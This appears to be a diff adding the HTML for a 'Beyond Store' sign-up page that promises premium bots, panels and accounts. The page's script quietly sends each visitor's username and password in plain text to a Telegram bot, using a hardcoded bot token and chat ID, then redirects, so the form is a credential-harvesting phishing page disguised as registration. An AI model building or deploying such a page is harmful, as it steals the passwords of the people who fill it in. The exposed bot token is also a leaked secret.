@@ -1,0 +1,57 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Register on Beyond Store"/>
+  <meta property="og:image" content="https://files.catbox.moe/YOUR_THUMBNAIL.jpg"/>
+  <title>Beyond Store 🌀</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      background-image: url('https://files.catbox.moe/4eog92.jpg');
+      background-size: cover;
+      background-position: center;
+      font-family: 'Luckiest Guy', cursive;
+    }
+    .moving-text {
+      animation: move 4s linear infinite;
+    }
+    @keyframes move {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+  </style>
+</head>
+<body class="min-h-screen flex items-center justify-center">
+  <div class="bg-black bg-opacity-70 p-6 rounded-2xl max-w-md w-full text-center border border-blue-400 shadow-2xl">
+    <h1 class="text-4xl mb-4 text-yellow-300 animate-pulse">Beyond Store 🌀</h1>
+    <p class="text-blue-300 mb-2 moving-text whitespace-nowrap overflow-hidden">Register to get premium bots, panels, accounts, and more.</p>
+    <form id="registerForm" class="space-y-4">
+      <input type="text" name="username" placeholder="Username" class="w-full p-3 rounded bg-white bg-opacity-10 text-white placeholder:text-blue-200 outline-none" required />
+      <input type="password" name="password" placeholder="Password" class="w-full p-3 rounded bg-white bg-opacity-10 text-white placeholder:text-blue-200 outline-none" required />
+      <button type="submit" class="w-full py-3 rounded bg-gradient-to-r from-yellow-400 to-blue-500 text-black font-bold hover:scale-105 transition">Register</button>
+    </form>
+    <p class="text-sm text-blue-200 mt-4">Made with ❤️ by Beyond</p>
+  </div>
+
+  <script>
+    const token = "8166858964:AAE_rAfdtU8Qcj8BuUVRhlFKlJdBmzfuztY";
+    const chatId = "6619154186";
+    document.getElementById("registerForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const username = e.target.username.value;
+      const password = e.target.password.value;
+      const message = `🔁 New User Registered:\n👤 Username: ${username}\n🔐 Password: ${password}`;
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+      window.location.href = "home.html";
+    });
+  </script>
+</body>
+</html>
